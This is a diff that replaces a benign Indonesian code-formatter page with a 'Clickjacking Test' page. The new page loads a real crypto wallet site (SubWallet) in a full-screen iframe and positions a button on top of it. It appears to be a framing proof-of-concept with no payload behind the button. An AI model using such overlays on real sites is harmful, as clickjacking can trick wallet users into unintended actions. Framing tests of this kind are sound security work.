@@ -1,207 +1,42 @@
-<!doctype html>
-<html lang="id">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Prettify Code — termireum.github.io</title>
-
-  <!-- Prism.js untuk syntax highlight -->
-  <link href="https://unpkg.com/prismjs@1.29.0/themes/prism-tomorrow.css" rel="stylesheet"/>
-
-  <style>
-    :root {
-      --bg: #0f1724;
-      --panel: #111827;
-      --muted: #94a3b8;
-      --accent: #60a5fa;
-    }
-    html, body {
-      height: 100%;
-      margin: 0;
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-    }
-    body {
-      background: linear-gradient(180deg, #071129 0%, #071726 100%);
-      color: #e6eef8;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 28px;
-    }
-    .card {
-      width: 100%;
-      max-width: 980px;
-      border-radius: 12px;
-      padding: 18px;
-      background: rgba(255, 255, 255, 0.03);
-      box-shadow: 0 6px 30px rgba(2, 6, 23, 0.6);
-    }
-    h1 {
-      margin: 0 0 8px;
-      font-size: 20px;
-    }
-    p.lead {
-      margin: 0 0 12px;
-      color: var(--muted);
-    }
-    .controls {
-      display: flex;
-      gap: 8px;
-      align-items: center;
-      margin: 12px 0;
-    }
-    select, button {
-      padding: 10px 12px;
-      border-radius: 8px;
-      border: 1px solid rgba(255, 255, 255, 0.05);
-      background: rgba(255, 255, 255, 0.05);
-      color: inherit;
-    }
-    button.primary {
-      background: linear-gradient(90deg, var(--accent), #3b82f6);
-      border: none;
-      color: #04233b;
-      font-weight: 600;
-    }
-    textarea {
-      width: 100%;
-      min-height: 300px;
-      padding: 12px;
-      border-radius: 8px;
-      border: 1px solid rgba(255, 255, 255, 0.05);
-      background: rgba(255, 255, 255, 0.02);
-      color: inherit;
-      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
-      font-size: 13px;
-      resize: vertical;
-    }
-    pre {
-      background: rgba(255, 255, 255, 0.02);
-      padding: 12px;
-      border-radius: 8px;
-      min-height: 300px;
-      overflow: auto;
-      font-size: 13px;
-    }
-    .small { font-size: 13px; color: var(--muted); }
-    .notice { margin-top: 8px; color: var(--muted); font-size: 13px; }
-    .footer { margin-top: 14px; color: var(--muted); font-size: 13px; text-align: right; }
-    .row { display: flex; gap: 12px; flex-wrap: wrap; }
-    .col { flex: 1; display: flex; flex-direction: column; }
-    @media (max-width: 880px) { .row { flex-direction: column; } }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Test</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        button {
+            position: absolute;
+            top: 31px;
+            right: 44px;
+            z-index: 1000;
+            padding: 12px 24px;
+            font-size: 16px;
+   background-color: #fff;
+            cursor: pointer;
+   border-radius: 25px;
+font-color: rgb(252, 114, 255);
+font-weight: 200;
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 100;
+            z-index: 999;
+        }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Prettify Code — contoh halaman untuk GitHub Pages</h1>
-    <p class="lead">Tempel kode JavaScript/HTML/CSS Anda di kiri, lalu klik <strong>Prettify</strong>.</p>
-
-    <div class="controls">
-      <label class="small">Bahasa:</label>
-      <select id="lang">
-        <option value="babel">JavaScript</option>
-        <option value="html">HTML</option>
-        <option value="css">CSS</option>
-      </select>
-
-      <label class="small">Indent:</label>
-      <select id="tabWidth">
-        <option value="2">2</option>
-        <option value="4" selected>4</option>
-        <option value="8">8</option>
-      </select>
-
-      <div style="flex:1"></div>
-      <button id="prettifyBtn" class="primary">Prettify</button>
-      <button id="copyBtn">Copy</button>
-      <button id="downloadBtn">Download</button>
-    </div>
-
-    <div class="row">
-      <div class="col">
-        <label class="small">Source</label>
-        <textarea id="source" placeholder="Tempel kode di sini...">
-// Contoh:
-function hello(name){console.log('hello, '+name)}hello('world')
-        </textarea>
-      </div>
-      <div class="col">
-        <label class="small">Hasil (formatted)</label>
-        <pre><code id="output" class="language-javascript"></code></pre>
-      </div>
-    </div>
-
-    <div class="notice">Halaman ini menggunakan <strong>Prettier v3.3.3</strong> via CDN + Prism.js untuk highlight.</div>
-    <div class="footer">© 2025 termireum.github.io</div>
-  </div>
-
-  <!-- Prettier v3 -->
-  <script src="https://unpkg.com/prettier@3.3.3/standalone.js"></script>
-  <script src="https://unpkg.com/prettier@3.3.3/plugins/babel.js"></script>
-  <script src="https://unpkg.com/prettier@3.3.3/plugins/html.js"></script>
-  <script src="https://unpkg.com/prettier@3.3.3/plugins/postcss.js"></script>
-
-  <!-- Prism.js -->
-  <script src="https://unpkg.com/prismjs@1.29.0/prism.js"></script>
-  <script src="https://unpkg.com/prismjs@1.29.0/components/prism-javascript.min.js"></script>
-  <script src="https://unpkg.com/prismjs@1.29.0/components/prism-css.min.js"></script>
-  <script src="https://unpkg.com/prismjs@1.29.0/components/prism-markup.min.js"></script>
-
-  <script>
-    const source = document.getElementById('source');
-    const output = document.getElementById('output');
-    const prettifyBtn = document.getElementById('prettifyBtn');
-    const copyBtn = document.getElementById('copyBtn');
-    const downloadBtn = document.getElementById('downloadBtn');
-    const lang = document.getElementById('lang');
-    const tabWidth = document.getElementById('tabWidth');
-
-    async function prettify() {
-      const code = source.value;
-      const parser = lang.value;
-      try {
-        const formatted = await prettier.format(code, {
-          parser,
-          plugins: prettierPlugins,
-          tabWidth: parseInt(tabWidth.value, 10),
-          semi: true,
-          singleQuote: true,
-          trailingComma: "es5",
-          bracketSpacing: true,
-        });
-        output.textContent = formatted.trim();
-        output.className = "language-" + (parser === "babel" ? "javascript" : parser);
-        Prism.highlightElement(output);
-      } catch (err) {
-        output.textContent = "// Error saat mem-format: " + err.message;
-      }
-    }
-
-    prettifyBtn.addEventListener("click", prettify);
-
-    copyBtn.addEventListener("click", async () => {
-      try {
-        await navigator.clipboard.writeText(output.textContent || "");
-        copyBtn.textContent = "Copied!";
-        setTimeout(() => (copyBtn.textContent = "Copy"), 1200);
-      } catch (e) {
-        alert("Gagal menyalin: " + e.message);
-      }
-    });
-
-    downloadBtn.addEventListener("click", () => {
-      const blob = new Blob([output.textContent || ""], { type: "text/plain" });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      const ext = lang.value === "babel" ? "js" : lang.value;
-      a.href = url;
-      a.download = `formatted.${ext}`;
-      a.click();
-      URL.revokeObjectURL(url);
-    });
-
-    // Auto prettify saat load pertama kali
-    window.addEventListener("load", prettify);
-  </script>
+    <iframe src="https://web.subwallet.app/home/tokens" frameborder="0"></iframe>
 </body>
 </html>
